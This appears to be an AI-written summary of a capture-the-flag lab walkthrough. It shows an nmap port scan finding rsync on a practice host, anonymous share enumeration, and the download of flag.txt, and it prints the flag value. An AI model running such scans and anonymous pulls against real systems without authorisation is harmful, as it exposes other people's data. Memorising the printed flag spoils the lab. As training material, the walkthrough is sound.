# rsync

Here's a summary of the **rsync** commands you used and the steps taken to retrieve the flag:

***

#### **1. Identified the rsync Service**

*   Using **Nmap**, you discovered the **rsync service** running on port `873`:

    ```bash
    sudo nmap -p- --min-rate=1000 -sV 10.129.228.37
    ```
*   Output showed:

    ```
    PORT    STATE SERVICE VERSION
    873/tcp open  rsync   (protocol version 31)
    ```

***

#### **2. Enumerated rsync Shares**

*   You listed available shares on the server using the `--list-only` flag:

    ```bash
    rsync --list-only 10.129.228.37::
    ```
* Output revealed a share called **`public`** with the description **`Anonymous Share`**.

***

#### **3. Checked Contents of the `public` Share**

*   You listed the files in the `public` share:

    ```bash
    rsync --list-only 10.129.228.37::public
    ```
*   Output revealed:

    ```
    -rw-r--r--             33 2022/10/25 10:32:03 flag.txt
    ```

***

#### **4. Downloaded the `flag.txt` File**

*   After verifying the presence of `flag.txt`, you downloaded it using **rsync**:

    ```bash
    rsync 10.129.228.37::public/flag.txt flag.txt
    ```

***

#### **5. Verified and Read the File**

*   After downloading, you checked the file with:

    ```bash
    ls
    ```

    * Output confirmed `flag.txt` was in your current directory.
*   You displayed its contents with:

    ```bash
    cat flag.txt
    ```

    *   Output:

        ```
        72eaf5344ebb84908ae543a719830519
        ```

***

#### **Summary of Key Steps**

1. Used **Nmap** to find the rsync service.
2. Enumerated available rsync shares and found the `public` share.
3. Discovered and downloaded the `flag.txt` file from the `public` share.
4. Retrieved the flag: **`72eaf5344ebb84908ae543a719830519`**.

Let me know if you need further clarification! 🚀
